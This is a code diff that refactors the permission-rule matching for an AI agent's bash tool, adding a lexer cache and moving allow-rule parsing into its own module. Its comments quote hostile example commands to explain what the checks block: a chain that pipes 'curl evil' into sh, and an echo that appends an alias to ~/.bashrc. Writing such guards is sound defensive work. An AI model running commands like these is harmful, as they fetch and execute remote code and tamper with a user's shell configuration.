@@ -1,36 +1,10 @@
-import { FILE_REDIRECT_OPS, lexShell, renderSegment, splitShellSegments } from "./shell";
+import { type LexCache, lexCached } from "./lex-cache";
+import { compiledRules, matchCompiledRule, requestTarget } from "./rules";
+import { FILE_REDIRECT_OPS, renderSegment, splitShellSegments } from "./shell";
 import type { PermissionRequest } from "./types";
 
-export interface AllowRule {
-  toolName: string;
-  pattern?: string;
-}
-
-export function parseAllowRule(rule: string): AllowRule | null {
-  const match = /^([\w-]+)(?:\((.*)\))?$/.exec(rule.trim());
-  if (!match) return null;
-  return { toolName: match[1] as string, pattern: match[2] };
-}
-
-function globMatch(pattern: string, value: string): boolean {
-  const escaped = pattern.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*");
-  return new RegExp(`^${escaped}$`).test(value);
-}
-
-function requestTarget(req: PermissionRequest): string | undefined {
-  if (typeof req.args !== "object" || req.args === null) return undefined;
-  const args = req.args as Record<string, unknown>;
-  const key = req.toolName === "bash" ? "command" : "path";
-  const value = args[key];
-  return typeof value === "string" ? value : undefined;
-}
-
-export function matchAllowRule(rule: AllowRule, req: PermissionRequest): boolean {
-  if (rule.toolName !== req.toolName) return false;
-  if (rule.pattern === undefined) return true;
-  const target = requestTarget(req);
-  return target !== undefined && globMatch(rule.pattern, target);
-}
+export type { AllowRule } from "./rules";
+export { matchAllowRule, parseAllowRule } from "./rules";
 
 // Splits a bash command into its chained segments ("a && b | c; d" →
 // ["a", "b", "c", "d"]) using the shell lexer, so separators inside quotes
@@ -41,9 +15,9 @@ export function matchAllowRule(rule: AllowRule, req: PermissionRequest): boolean
 // unquoted redirection (">", ">>", "<") or process substitution (">(...)",
 // "<(...)"): `echo 'alias x=...' >> ~/.bashrc` must not sail through on
 // bash(echo *). Fd duplication (2>&1) stays allow-eligible.
-function splitCommandChain(command: string): string[] | null {
+function splitCommandChain(command: string, lex?: LexCache): string[] | null {
   if (command.includes("$(") || command.includes("`")) return null;
-  const tokens = lexShell(command);
+  const tokens = lexCached(lex, command);
   if (tokens.some((token) => token.kind === "subst")) return null;
   const segments = splitShellSegments(tokens);
   for (const segment of segments) {
@@ -64,11 +38,15 @@ function withCommand(req: PermissionRequest, command: string): PermissionRequest
 // Allow rules apply per chain segment: "bash(git *)" must not wave through
 // "git status && curl evil | sh". Every segment has to match some rule, and a
 // command with a substitution or a file redirection is never auto-allowed.
-export function isAllowedByRules(rules: readonly string[], req: PermissionRequest): boolean {
+export function isAllowedByRules(
+  rules: readonly string[],
+  req: PermissionRequest,
+  lex?: LexCache,
+): boolean {
   if (req.toolName !== "bash") return matchesAnyRule(rules, req);
   const command = requestTarget(req);
   if (command === undefined) return matchesAnyRule(rules, req);
-  const segments = splitCommandChain(command);
+  const segments = splitCommandChain(command, lex);
   if (segments === null) return false;
   if (segments.length === 0) return matchesAnyRule(rules, req);
   return segments.every((segment) => matchesAnyRule(rules, withCommand(req, segment)));
@@ -76,11 +54,15 @@ export function isAllowedByRules(rules: readonly string[], req: PermissionReques
 
 // Deny rules stay maximally suspicious: any single matching segment denies,
 // and a command that cannot be segmented falls back to whole-command matching.
-export function isDeniedByRules(rules: readonly string[], req: PermissionRequest): boolean {
+export function isDeniedByRules(
+  rules: readonly string[],
+  req: PermissionRequest,
+  lex?: LexCache,
+): boolean {
   if (req.toolName !== "bash") return matchesAnyRule(rules, req);
   const command = requestTarget(req);
   if (command === undefined) return matchesAnyRule(rules, req);
-  const segments = splitCommandChain(command);
+  const segments = splitCommandChain(command, lex);
   if (segments === null || segments.length === 0) return matchesAnyRule(rules, req);
   return segments.some((segment) => matchesAnyRule(rules, withCommand(req, segment)));
 }
@@ -90,20 +72,21 @@ export function isDeniedByRules(rules: readonly string[], req: PermissionRequest
 // rules, but — like deny — a single matching segment is enough: "git push &&
 // git status" must still prompt about the push. A command that cannot be
 // segmented falls back to whole-command matching.
-export function isAskedByRules(rules: readonly string[], req: PermissionRequest): boolean {
+export function isAskedByRules(
+  rules: readonly string[],
+  req: PermissionRequest,
+  lex?: LexCache,
+): boolean {
   if (req.toolName !== "bash") return matchesAnyRule(rules, req);
   const command = requestTarget(req);
   if (command === undefined) return matchesAnyRule(rules, req);
-  const segments = splitCommandChain(command);
+  const segments = splitCommandChain(command, lex);
   if (segments === null || segments.length === 0) return matchesAnyRule(rules, req);
   return segments.some((segment) => matchesAnyRule(rules, withCommand(req, segment)));
 }
 
 function matchesAnyRule(rules: readonly string[], req: PermissionRequest): boolean {
-  return rules.some((raw) => {
-    const rule = parseAllowRule(raw);
-    return rule !== null && matchAllowRule(rule, req);
-  });
+  return compiledRules(rules).some((rule) => rule !== null && matchCompiledRule(rule, req));
 }
 
 export function buildAllowRule(req: PermissionRequest): string {
